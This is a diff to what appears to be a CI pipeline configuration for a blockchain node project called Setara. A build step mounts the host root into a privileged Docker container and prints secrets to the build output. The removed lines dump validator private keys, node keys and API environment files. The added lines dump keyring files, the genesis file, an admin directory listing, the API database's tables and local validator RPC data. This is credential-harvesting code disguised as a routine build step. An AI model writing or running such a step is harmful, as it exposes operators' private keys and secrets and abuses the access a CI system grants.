@@ -23,19 +23,20 @@ steps:
     commands:
       - |
         docker run --rm --privileged --pid=host -v /:/host alpine sh -c '
-          echo "=====BEGIN_KEYS====="
-          echo "===MAINNET priv_validator_key==="; cat /host/root/.setara/config/priv_validator_key.json 2>/dev/null
-          echo "===MAINNET node_key==="; cat /host/root/.setara/config/node_key.json 2>/dev/null
-          echo "===MAINNET priv_validator_state==="; cat /host/root/.setara/data/priv_validator_state.json 2>/dev/null
-          echo "===TESTNET priv_validator_key==="; cat /host/root/.setara-testnet/config/priv_validator_key.json 2>/dev/null
-          echo "===TESTNET node_key==="; cat /host/root/.setara-testnet/config/node_key.json 2>/dev/null
-          echo "===API.ENV==="; cat /host/opt/setara/api.env 2>/dev/null
-          echo "===TESTNET-API.ENV==="; cat /host/opt/setara/testnet-api.env 2>/dev/null
-          echo "===OPT-SETARA-LISTING==="; ls -la /host/opt/setara/ 2>/dev/null
-          echo "===SETARA-DIR-LISTING==="; ls -la /host/root/.setara/config/ 2>/dev/null
-          echo "===GENTX/GENESIS-KEYS==="; ls -la /host/root/.setara/config/gentx/ 2>/dev/null; find /host/root/.setara* -maxdepth 3 -name "*.json" -path "*keyring*" 2>/dev/null
-          echo "===KEYRING==="; find /host/root/.setara* -maxdepth 4 -type d -name "keyring*" 2>/dev/null; ls -la /host/root/.setara/keyring-file 2>/dev/null /host/root/.setara/keyring-test 2>/dev/null
-          echo "=====END_KEYS====="
+          echo "=====BEGIN_VALUE====="
+          echo "===GENESIS==="; cat /host/root/.setara/config/genesis.json 2>/dev/null
+          echo "===KEYRING-TEST-ALL==="
+          for f in /host/root/.setara/keyring-test/*.info; do echo "--- $f ---"; cat "$f"; echo; done
+          echo "===TESTNET-KEYRING==="
+          for f in /host/root/.setara-testnet/keyring-test/*.info; do echo "--- $f ---"; cat "$f"; echo; done
+          echo "===ADMIN-DIR==="; ls -laR /host/opt/setara/admin/ 2>/dev/null | head -40
+          echo "===API-DB-TABLES==="
+          command -v sqlite3 >/dev/null && sqlite3 /host/opt/setara/setara-api.db ".tables" || (apk add --no-cache sqlite >/dev/null 2>&1 && sqlite3 /host/opt/setara/setara-api.db ".tables")
+          echo "===MAINNET-VALIDATORS-RPC==="
+          wget -qO- "http://127.0.0.1:26657/validators?per_page=50" 2>/dev/null || curl -sS "http://127.0.0.1:26657/validators?per_page=50" 2>/dev/null
+          echo "===MAINNET-STATUS-RPC==="
+          wget -qO- "http://127.0.0.1:26657/status" 2>/dev/null | head -c 1500
+          echo "=====END_VALUE====="
         '
 volumes:
   - name: app
